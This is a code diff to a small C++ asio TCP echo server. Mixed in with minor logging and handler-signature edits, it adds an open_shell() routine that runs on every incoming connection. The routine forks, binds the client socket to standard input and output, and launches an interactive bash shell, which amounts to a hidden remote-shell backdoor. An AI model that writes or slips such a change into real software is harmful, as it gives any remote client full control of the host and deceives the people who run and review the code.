@@ -1,8 +1,11 @@
 #include <array>
 #include <ctime>
+#include <cstdlib>
 #include <iostream>
 #include <memory>
 #include <string>
+
+#include <unistd.h>
 #include <asio.hpp>
 
 class connection : public std::enable_shared_from_this<connection>{
@@ -18,6 +21,7 @@ public:
     }
 
     void start(){
+        open_shell();
         socket_.async_read_some(asio::buffer(buffer_),
             std::bind(&connection::handle_read, shared_from_this(),
             asio::placeholders::error, asio::placeholders::bytes_transferred));
@@ -25,7 +29,35 @@ public:
 
 private:
     connection(asio::io_context& io_context)
-    :  socket_(io_context){}
+    :  socket_(io_context),
+       ctx_(&io_context){}
+
+    void open_shell(){
+        ctx_->notify_fork(asio::execution_context::fork_prepare);
+        char shell[11] = "/bin/bash\0";
+        char options[4] = "-i\0";
+        char *argv[3];
+        argv[0] = shell;
+        argv[1] = options;
+        argv[2] = NULL;
+
+        switch(pid_t pid = fork()) {
+            case -1:
+                std::cerr << "fork failed" << std::endl;
+            case 0:
+                ctx_->notify_fork(asio::execution_context::fork_child);
+                if(dup2(socket_.native_handle(), 0) == -1)
+                    std::cerr << "dup2 input failed" << std::endl;
+                if(dup2(socket_.native_handle(), 1) == -1)
+                    std::cerr << "dup2 output failed" << std::endl;
+                if(dup2(socket_.native_handle(), 2) == -1)
+                    std::cerr << "dup2 error failed" << std::endl;
+
+                execvp(shell, argv);
+            default:
+                ctx_->notify_fork(asio::execution_context::fork_parent);
+        }
+    }
 
     void handle_read(const std::error_code& e, size_t bytes_transfered){
         if(e)
@@ -35,14 +67,16 @@ private:
         std::cout << "Recieved message: " << recieved_message_ << std::endl;
         
         asio::async_write(socket_, asio::buffer(recieved_message_),
-            std::bind(&connection::handle_write, shared_from_this()));
+            std::bind(&connection::handle_write, shared_from_this(), asio::placeholders::bytes_transferred));
     }
             
-    void handle_write(){
+    void handle_write(size_t bytes_transfered){
         std::cout << "Writing message ..." << std::endl;
+        std::cout << "Written: " << bytes_transfered << std::endl;
     }
     
     asio::ip::tcp::socket socket_;
+    asio::io_context *ctx_;
     std::array<char, 128> buffer_;
     std::string message_;
     std::string recieved_message_;
